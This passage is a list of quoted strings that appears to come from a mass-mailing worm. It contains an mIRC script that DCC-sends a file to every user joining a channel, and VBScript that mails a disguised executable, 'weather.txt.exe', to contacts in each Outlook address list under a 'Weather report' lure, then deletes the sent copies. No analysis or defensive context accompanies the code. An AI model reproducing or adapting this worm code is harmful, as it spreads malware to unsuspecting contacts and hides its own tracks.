            "d:\\mirc\\script.ini",
            "c:\\mailme.vbs",
            "\\weather.txt.exe",
            "c:\\weather.txt.exe",
            "[script]",
            "n3=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt } | /f0rkit \"}",
            "n4=alias /f0rkit /dcc send $nick ",
            "On Error Resume Next",
            "Dim weather, Mail, Counter, A, C, D, E, F",
            "Set weather = CreateObject (\"outlook.application\")",
            "Set Mail = weather.GetNameSpace (\"MAPI\")",
            "For A = 1 To Mail.AddressLists.Count",
            "Set B = Mail.AddressLists (A)",
            "Counter = 1",
            "Set C = weather.CreateItem (0)",
            "For D = 1 To B.AddressEntries.Count",
            "E = B.AddressEntries (Counter)",
            "C.Recipients.Add E",
            "Counter = Counter + 1",
            "If Counter > 80 Then Exit For",
            "Next",
            "C.Subject = \"Weather report\"",
            "C.Body = \"Hello. Yes, the weather's getting better, it's real sunny in some countries. Check the attached weather report for your country.\"",
            "C.Attachments.Add \"c:\\weather.txt.exe\"",
            "C.DeleteAfterSubmit = True",
            "C.Send",
            "E = \"\"",
            "Next",
            "Set F = CreateObject (\"Scripting.FileSystemObject\")",
